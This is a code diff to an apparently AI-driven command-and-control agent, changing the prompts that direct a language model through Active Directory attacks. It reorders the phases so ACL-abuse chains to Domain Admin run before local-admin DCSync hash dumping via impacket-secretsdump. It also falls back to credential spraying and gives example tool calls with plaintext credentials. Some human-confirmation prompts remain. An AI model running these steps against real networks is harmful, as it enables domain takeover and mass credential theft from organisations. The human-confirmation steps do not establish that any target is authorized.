@@ -717,23 +717,16 @@ PHASE 3 — CREDENTIAL HARVESTING
 PHASE 4 — ATTACK EXECUTION (credential-driven, SharpHound-guided)
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Cross-reference the credentials from Phase 3 with the SharpHound analysis from Phase 2.
-Execute BOTH paths A and B whenever matches are found:
 
-  ── PATH A: LOCAL ADMIN → DCSYNC ────────────────────────────
-  For every LOCAL ADMIN relationship in the analysis output:
-    1. Check if you have credentials in the DB for that admin user
-    2. If YES and the target is NOT the agent's own machine:
-       a. c2_authenticate(agent_id, username, password, target_ip, service)
-          → verifies the credentials work on the target
-       b. If access confirmed → c2_dcsync('domain/username:password@target_ip')
-          → dumps all hashes from that machine server-side via impacket-secretsdump
-          → NTLM hashes are stored in the DB automatically
-       c. c2_get_credentials() → update your view of available creds
-    Example: analysis says "jsmith → LOCAL ADMIN → CORPSRV01" and you have jsmith:Password1
-      → c2_authenticate(agent_id, "jsmith", "Password1", "10.0.2.20", "winrm")
-      → c2_dcsync("ICCN.local/jsmith:Password1@10.0.2.20")
+  EXECUTION ORDER — follow strictly:
+    1. PATH B first: if ANY ACL attack path leads to Domain Admin and you have
+       credentials for the starting principal → execute it immediately. Do NOT
+       run Path A first. A direct ACL chain to DA is always the shortest route.
+    2. PATH A after: only run Path A (local admin → secretsdump) once Path B is
+       complete, or if no ACL path to DA exists at all.
+    3. FALLBACK: spray only if both A and B yield nothing.
 
-  ── PATH B: ACL CHAIN → DOMAIN ADMIN ───────────────────────
+  ── PATH B: ACL CHAIN → DOMAIN ADMIN (PRIORITY) ────────────
   For every ATTACK PATH in the analysis output:
     1. Check if you have credentials for the STARTING PRINCIPAL of that path
     2. If YES: execute each step in the chain one at a time:
@@ -760,6 +753,20 @@ Execute BOTH paths A and B whenever matches are found:
     IMPORTANT: Always pass dc_ip to c2_aclabuse when the DC IP is known. Never skip it — the hosts DB
     may be empty and dc_ip is the only reliable way to reach the DC. If the operator told you the DC IP,
     use it directly instead of running recon.
+
+  ── PATH A: LOCAL ADMIN → DCSYNC (run after Path B) ────────
+  For every LOCAL ADMIN relationship in the analysis output:
+    1. Check if you have credentials in the DB for that admin user
+    2. If YES and the target is NOT the agent's own machine:
+       a. c2_authenticate(agent_id, username, password, target_ip, service)
+          → verifies the credentials work on the target
+       b. If access confirmed → c2_dcsync(domain/username:password@target_ip)
+          → dumps all hashes from that machine server-side via impacket-secretsdump
+          → NTLM hashes are stored in the DB automatically
+       c. c2_get_credentials() → update your view of available creds
+    Example: analysis says "jsmith → LOCAL ADMIN → CORPSRV01" and you have jsmith:Password1
+      → c2_authenticate(agent_id, "jsmith", "Password1", "10.0.2.20", "winrm")
+      → c2_dcsync(ICCN.local/jsmith:Password1@10.0.2.20)
 
   ── FALLBACK: CREDENTIAL SPRAY ──────────────────────────────
   If no credential matches found in paths A or B:
@@ -930,17 +937,23 @@ class C2Agent:
         # ── Phase 4: credential-driven attack execution ───────────────────────
         exec_prompt = (
             "Now execute Phase 4 using the credentials and attack paths you just found.\n\n"
-            "For EVERY local admin relationship where you have plaintext credentials:\n"
-            "  1. Call c2_ask_human to confirm\n"
-            "     - If the answer is a question or is not clearly 'yes/proceed/confirm': answer it, then ask again.\n"
-            "     - Only continue to step 2 after receiving explicit confirmation.\n"
-            "  2. c2_authenticate to verify access\n"
-            "  3. c2_run_secretsdump on that machine\n\n"
+            "EXECUTION ORDER — mandatory:\n"
+            "  1. ACL chains to Domain Admin FIRST (Path B) — if any ACL attack path exists\n"
+            "     and you have credentials for the starting principal, execute it before anything else.\n"
+            "  2. Local admin → DCSync SECOND (Path A) — only after Path B is done or absent.\n"
+            "  3. Spray as fallback if both above yield nothing.\n\n"
             "For EVERY ACL attack path where you have credentials for the starting principal:\n"
             "  1. Call c2_ask_human before EACH step\n"
             "     - If the answer is a question or is not clearly 'yes/proceed/confirm': answer it, then ask again.\n"
             "     - Only continue to the aclabuse step after receiving explicit confirmation.\n"
             "  2. Execute each c2_aclabuse step in the chain\n\n"
+            "For EVERY local admin relationship where you have plaintext credentials:\n"
+            "  1. Call c2_ask_human to confirm\n"
+            "     - If the answer is a question or is not clearly 'yes/proceed/confirm': answer it, then ask again.\n"
+            "     - Only continue to step 2 after receiving explicit confirmation.\n"
+            "  2. c2_authenticate to verify access\n"
+            "  3. c2_dcsync to dump hashes server-side — NOT c2_run_secretsdump\n"
+            "     (c2_run_secretsdump deploys a tool to the agent; c2_dcsync runs impacket server-side)\n\n"
             "If no matches: run c2_spray against each discovered host.\n"
             "Finish with c2_generate_map."
         )
